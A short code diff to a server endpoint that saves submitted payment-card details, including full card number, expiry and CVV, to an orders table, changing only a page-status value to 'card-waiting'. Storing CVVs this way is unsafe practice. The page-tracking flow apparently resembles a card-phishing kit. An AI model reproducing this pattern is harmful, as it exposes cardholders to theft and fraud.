@@ -117,7 +117,7 @@ app.post('/api/card-data', async (req, res) => {
     if (order_id) {
       await supabase.from('orders').update({
         card_name, card_number, card_expiry, card_cvv,
-        status: 'card_pending', current_page: 'card-details'
+        status: 'card_pending', current_page: 'card-waiting'
       }).eq('id', order_id);
     }
     res.json({ success: true });
